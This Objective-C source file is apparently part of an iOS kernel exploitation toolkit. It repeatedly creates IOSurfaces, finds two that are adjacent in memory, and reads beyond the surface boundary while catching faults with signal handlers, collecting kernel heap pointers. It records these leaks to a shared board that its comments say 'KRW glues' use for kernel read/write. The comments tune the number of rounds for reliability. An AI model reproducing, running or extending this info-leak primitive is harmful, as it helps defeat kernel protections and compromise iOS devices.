//
//  P159IOSurfaceAdjacency.m
//  P007OpenOnly
//
//  Technique from Rust505/iosurface-adjacent-oob (MIT). Read-only.
//
//  V2 HARVEST (2026-11-19): V1 recorded ONLY the first canonical kptr of a
//  window whose own log rows often showed 12 — and the adjacency lottery is
//  the non-determinism (the "click 2+ times" receipt). V2 records EVERY
//  DISTINCT canonical kptr and runs the create->adjacency->scan lottery up
//  to P159_ROUNDS times per tap, stopping early at P159_WANT_ANCHORS
//  distinct anchors. The KRW glues call this automatically when the
//  board's same-boot anchor set is thin (LabHeapAnchorHarvestIfThin).
//

#import "P159IOSurfaceAdjacency.h"
#import "LabDeviceProfile.h"
#import "LabLocalTime.h"
#import "P007Board.h"
#import "LabLearn.h"

#import <Foundation/Foundation.h>
#import <IOSurface/IOSurfaceRef.h>
#import <setjmp.h>
#import <signal.h>
#include <string.h>

#define P159_BUILD @"p159-iosurface-adjacency-v3-harvest"
#define P159_ROUNDS 32  /* 2026-11-20: doubled again (16 -> 32, the receipt law:
                             "the 159 is not churning enough") — the 33% per-round
                             hit rate gives ~10.6 expected anchors at 32 rounds,
                             which fills the full 8-slot anchor set in ONE tap
                             instead of stopping at 2 (the want=2 bug, also fixed
                             tonight). Still <2s total surface-create time. */
#define P159_WANT_ANCHORS 4
#define P159_MAX_ANCHORS 8

static sigjmp_buf g_jmp;
static volatile sig_atomic_t g_faulted;

static void p159_handler(int sig, siginfo_t *si, void *uc) {
    (void)sig; (void)si; (void)uc;
    g_faulted = 1;
    siglongjmp(g_jmp, 1);
}

static BOOL p159_is_kernel(uint64_t v) {
    /* Canonical kernel ranges only. Tags such as 0xffffffa6... and
       0xffffe383... are below the zone map and are NOT kernel pointers. */
    if ([[LabDeviceProfile osversion] hasPrefix:@"24"]) { /* T8150 27.x */
        if (v >= 0xfffffe0000000000ULL && v < 0xfffffe1000000000ULL) return YES;
    } else if (v >= 0xfffffff000000000ULL && v < 0xfffffff100000000ULL) {
        return YES;
    }
    return v >= 0xffffffe000000000ULL && v < 0xfffffff000000000ULL;
}

static BOOL p159_anchor_known(const uint64_t *arr, int n, uint64_t v) {
    for (int i = 0; i < n; i++) if (arr[i] == v) return YES;
    return NO;
}

@implementation P159IOSurfaceAdjacency

+ (NSString *)tap {
    NSMutableString *o = [NSMutableString string];
    [o appendFormat:@"=== p159 session %@ BUILD %@ ===\n",
        LabLocalMilitaryNow(), P159_BUILD];
    [o appendString:[LabDeviceProfile identBlock]];
    [o appendFormat:@"[*] HARVEST: up to %d rounds, want %d distinct anchors, "
                   @"record EVERY distinct kptr (heap band never derives a slide).\n",
        P159_ROUNDS, P159_WANT_ANCHORS];

    NSDictionary *props = @{
        @"IOSurfaceWidth": @64, @"IOSurfaceHeight": @64,
        @"IOSurfaceBytesPerElement": @4,
        @"IOSurfacePixelFormat": @0x42475241,
    };

    uint64_t anchors[P159_MAX_ANCHORS];
    int anchorN = 0;
    int roundsRun = 0, adjMisses = 0;
    uint64_t totalKptr = 0, totalNonzero = 0;

    struct sigaction sa, old_segv, old_bus;
    memset(&sa, 0, sizeof(sa));
    sa.sa_sigaction = p159_handler;
    sa.sa_flags = SA_SIGINFO | SA_NODEFER;
    sigemptyset(&sa.sa_mask);
    sigaction(SIGSEGV, &sa, &old_segv);
    sigaction(SIGBUS, &sa, &old_bus);

    for (int round = 0; round < P159_ROUNDS && anchorN < P159_WANT_ANCHORS; round++) {
        IOSurfaceRef surfaces[50];
        uintptr_t bases[50];
        int count = 0;
        for (int i = 0; i < 50; i++) {
            IOSurfaceRef s = IOSurfaceCreate((__bridge CFDictionaryRef)props);
            if (!s) continue;
            surfaces[count] = s;
            bases[count] = (uintptr_t)IOSurfaceGetBaseAddress(s);
            count++;
        }
        if (round == 0)
            [o appendFormat:@"  [create] %d/50 surfaces (16 KB each)\n", count];

        int idx = -1;
        for (int i = 0; i < count - 1; i++) {
            if (bases[i] && bases[i + 1] && bases[i + 1] - bases[i] == 0x4000) {
                idx = i;
                break;
            }
        }
        if (idx < 0) {
            adjMisses++;
            if (round == 0)
                [o appendString:@"  [adjacency] none with delta 0x4000 this round\n"];
            for (int i = 0; i < count; i++) CFRelease(surfaces[i]);
            continue;
        }
        uintptr_t b2 = bases[idx + 1];
        if (round == 0)
            [o appendFormat:@"  [adjacency] idx=%d b1=0x%llx b2=0x%llx delta=0x4000\n",
                idx, (unsigned long long)bases[idx], (unsigned long long)b2];

        /* Read-only scan: from b2 to b2+0x10000 (or the first fault). */
        uint64_t kptr = 0, nonzero = 0, sampled = 0;
        for (uintptr_t addr = b2; addr < b2 + 0x10000; addr += 8) {
            uint64_t v = 0;
            g_faulted = 0;
            if (sigsetjmp(g_jmp, 1) == 0) {
                v = *(volatile uint64_t *)addr;
            } else {
                break;
            }
            if (!v) continue;
            nonzero++;
            if (p159_is_kernel(v)) {
                kptr++;
                /* HARVEST: record every DISTINCT canonical kptr, not just the first */
                if (anchorN < P159_MAX_ANCHORS &&
                    !p159_anchor_known(anchors, anchorN, v)) {
                    anchors[anchorN++] = v;
                    @try {
                        [[P007Board shared] recordHeapLeak:v source:@"p159_isurface"];
                    } @catch (__unused NSException *e) {}
                    [o appendFormat:@"  [anchor %d] r%d +0x%04llx = 0x%016llx (board heap leak)\n",
                        anchorN, round, (unsigned long long)(addr - b2),
                        (unsigned long long)v];
                } else if (sampled < 4) {
                    [o appendFormat:@"  [kptr] r%d +0x%04llx = 0x%016llx\n",
                        round, (unsigned long long)(addr - b2), (unsigned long long)v];
                    sampled++;
                }
            }
        }
        totalKptr += kptr;
        totalNonzero += nonzero;
        [o appendFormat:@"  [round %d] nonzero=%llu kptr=%llu anchors-now=%d\n",
            round, (unsigned long long)nonzero, (unsigned long long)kptr, anchorN];
        roundsRun++;
        for (int i = 0; i < count; i++) CFRelease(surfaces[i]);
    }

    sigaction(SIGSEGV, &old_segv, NULL);
    sigaction(SIGBUS, &old_bus, NULL);

    [o appendFormat:@"  [res] rounds=%d/%d adjacency-misses=%d nonzero=%llu "
                   "canonical-kernel=%llu anchors-recorded=%d\n",
        roundsRun, P159_ROUNDS, adjMisses,
        (unsigned long long)totalNonzero, (unsigned long long)totalKptr, anchorN];
    if (anchorN > 0) {
        [o appendString:@"  [verdict] kptr LEAK harvest: distinct canonical kernel-band "
                       @"pointers read from user VA through the adjacency window (heap band). "
                       @"Leak-class, NOT kbase (heap VAs never derive a slide). ALL recorded "
                       @"to the board — the KRW anchor glues consume them automatically.\n"];
        [LabLearn recordPath:@"p159"
                      result:@"KPTR-HARVEST"
                    evidence:[NSString stringWithFormat:@"rounds=%d kptr=%llu anchors=%d",
                              roundsRun, (unsigned long long)totalKptr, anchorN]];
    } else if (totalKptr > 0) {
        [o appendString:@"  [verdict] kptr rows seen but no NEW distinct anchors this tap "
                       @"(all duplicates of earlier rounds). Adjacency real; leak-class.\n"];
        [LabLearn recordPath:@"p159"
                      result:@"KPTR-DUP"
                    evidence:[NSString stringWithFormat:@"rounds=%d kptr=%llu",
                              roundsRun, (unsigned long long)totalKptr]];
    } else if (roundsRun > 0) {
        [o appendString:@"  [verdict] read-only adjacency receipt. Adjacency real; this tap's "
                       @"windows were tags/tagged values only (0 canonical kernel pointers).\n"];
        [LabLearn recordPath:@"p159"
                      result:@"ADJACENCY-ONLY"
                    evidence:[NSString stringWithFormat:@"rounds=%d nonzero=%llu",
                              roundsRun, (unsigned long long)totalNonzero]];
    } else {
        [o appendString:@"  [verdict] no adjacency pair in any round — heap churn too quiet "
                       @"this tap. One more tap re-rolls the lottery.\n"];
        [LabLearn recordPath:@"p159"
                      result:@"NO-ADJACENCY"
                    evidence:@"create-only"];
    }
    [o appendFormat:@"=== p159 end %@ ===\n", LabLocalMilitaryNow()];
    return o;
}

@end
